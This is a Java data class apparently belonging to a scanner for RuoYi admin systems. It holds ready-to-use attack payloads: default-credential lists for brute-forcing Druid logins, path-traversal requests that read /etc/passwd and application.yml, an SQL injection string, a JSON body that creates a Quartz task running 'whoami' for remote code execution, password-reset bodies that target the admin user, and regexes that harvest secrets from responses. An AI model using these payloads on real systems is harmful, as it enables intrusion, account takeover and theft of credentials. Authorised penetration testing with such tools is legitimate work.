package com.ruoyi.scanner.poc;

import com.ruoyi.scanner.poc.PocData.DruidPoc.DruidCredential;

/** All POC/mutation data, deserialized from JSON files under poc/ dir. */
public class PocData {

  // ── swagger.json ──────────────────────────────────────────
  public static class SwaggerPoc {
    /** URL paths to probe for Swagger/OpenAPI endpoints */
    public String[] paths = {
      "/swagger-resources", "/swagger-ui.html", "/swagger-ui/index.html",
      "/doc.html", "/v2/api-docs", "/v3/api-docs",
      "/swagger-ui/swagger-initializer.js", "/swagger-ui/oauth2-redirect.html",
      "/webjars/springfox-swagger-ui/springfox.css",
      "/swagger-resources/configuration/ui",
      "/swagger-resources/configuration/security"
    };

    /** strings that indicate Swagger is present in the response body */
    public String[] features = {
      "Swagger", "swagger", "Swagger2", "OpenAPI",
      "springfox", "api-docs", "swagger-ui"
    };

    /** response patterns that indicate this is NOT swagger */
    public String[] deny_patterns = {
      "login", "Login", "404", "403",
      "未授权", "没有权限", "服务内部错误"
    };
  }

  // ── druid.json ────────────────────────────────────────────
  public static class DruidPoc {
    /** URL paths to probe for Druid Monitor */
    public String[] paths = {
      "/druid/index.html", "/druid/login.html",
      "/druid/websession.html", "/druid/datasource.html",
      "/druid/sql.html", "/druid/spring.html",
      "/druid/api.html", "/druid/basic.json"
    };

    /** username/password pairs for Druid login bruteforce */
    public DruidCredential[] credentials = {
      new DruidCredential("ruoyi", "123456"),
      new DruidCredential("admin", "admin123"),
      new DruidCredential("admin", "123456"),
      new DruidCredential("druid", "druid"),
      new DruidCredential("ruoyi", "ruoyi123"),
      new DruidCredential("admin", "ruoyi456")
    };

    public static class DruidCredential {
      public String username;
      public String password;
      public DruidCredential() {}
      public DruidCredential(String u, String p) { this.username = u; this.password = p; }
    }
  }

  // ── basic.json (file-download, sql-inj, scheduled-task, password-reset) ──
  public static class BasicPoc {
    /** file-download probe: each entry is [relativePath, keywordInResponse] */
    public String[][] file_download = {
      { "/common/download/resource?resource=/etc/passwd", "root:" },
      { "/common/download/resource?resource=../../../etc/passwd", "root:" },
      { "/profile/../../../../etc/passwd", "root:" },
      { "/common/download?fileName=../../../etc/passwd&delete=false", "root:" },
      { "/common/download/resource?resource=/windows/win.ini", "for 16-bit" },
      { "/common/download/resource?resource=../../../windows/win.ini", "for 16-bit" },
      { "/common/download?fileName=../application.yml", "spring:" },
      { "/common/download/resource?resource=/profile/application.yml", "spring:" }
    };

    /** URL paths to probe for SQL injection (orderByColumn/isAsc) */
    public String[] sql_injection_paths = {
      "/system/user/list",
      "/system/role/list",
      "/system/dept/list",
      "/system/post/list",
      "/system/dict/type/list",
      "/system/dict/data/list",
      "/system/config/list",
      "/system/notice/list",
      "/system/operlog/list",
      "/system/logininfor/list",
      "/system/user/online/list"
    };

    /** The injection payload appended as orderByColumn= */
    public String sql_injection_inject = "1 and 1=2";

    /** Error keywords that confirm injection */
    public String[] sql_injection_error_keywords = {
      "syntax error", "SQL", "sql", "mysql", "SQLITE_ERROR",
      "ORA-", "com.mysql", "oacle.jdbc", "Column not found"
    };

    /** JSON body for creating a malicious Quartz scheduled task */
    public String scheduled_task_json =
      "{\"jobName\":\"rce\",\"jobGroup\":\"DEFAULT\"," +
      "\"invokeTarget\":\"ryTask.ryParams('whoami')\"," +
      "\"cronExpression\":\"*/10 * * * * ?\"," +
      "\"misfirePolicy\":\"1\",\"concurrent\":\"1\",\"status\":\"0\"}";

    /** JSON body for password-reset probe */
    public String password_reset_json =
      "{\"userId\":1,\"password\":\"test123456\"}";

    /** JSON body for password-reset-with-oldpwd probe */
    public String password_reset_with_old_json =
      "{\"userId\":1,\"oldPassword\":\"admin123\",\"newPassword\":\"test123456\"}";
  }

  // ── system_api.json ─────────────────────────────────────
  public static class SystemApiPoc {
    /** backend API paths to detect RuoYi system endpoints */
    public String[] paths = {
      "/system/user/list", "/system/role/list", "/system/dept/list",
      "/system/post/list", "/system/dict/type/list", "/system/dict/data/list",
      "/system/config/list", "/system/notice/list", "/system/operlog/list",
      "/system/logininfor/list", "/system/user/online/list",
      "/monitor/job/list", "/monitor/operlog/list",
      "/tool/gen/list", "/common/download/resource"
    };
  }

  // ── sensitive.json (regex rules) ─────────────────────────
  public static class SensitivePoc {
    public SensitiveRule[] rules = {
      new SensitiveRule("手机号", "1[3-9]\\d{9}", "phone"),
      new SensitiveRule("身份证号", "\\d{17}[\\dX]", "idcard"),
      new SensitiveRule("邮箱", "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}", "email"),
      new SensitiveRule("IP地址", "\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b", "ip"),
      new SensitiveRule("内网IP", "\\b(?:10\\.|172\\.(?:1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.)", "ip_internal"),
      new SensitiveRule("云密钥 AK", "(?i)(access_key|secret_key|accesskey|secretkey)\\s*[=:]\\s*\\S+", "cloud_key"),
      new SensitiveRule("授权Token", "(?i)(Authorization|Bearer|Token|JWT)\\s*[=:]\\s*\\S+", "token"),
      new SensitiveRule("数据库密码", "(?i)(password|pwd|jdbc.password)\\s*[=:]\\s*\\S+", "db_password"),
      new SensitiveRule("Redis URL", "redis://\\S+", "redis"),
      new SensitiveRule("内网地址", "\\b(172\\.(?:1[6-9]|2[0-9]|3[01])\\.|10\\.|192\\.168\\.)", "internal_net"),
      new SensitiveRule("密钥对", "-----BEGIN.*KEY-----", "private_key"),
      new SensitiveRule("JWT令牌", "eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+", "jwt")
    };

    public static class SensitiveRule {
      public String name;
      public String pattern;
      public String type;
      public SensitiveRule() {}
      public SensitiveRule(String n, String p, String t) { this.name = n; this.pattern = p; this.type = t; }
    }
  }
}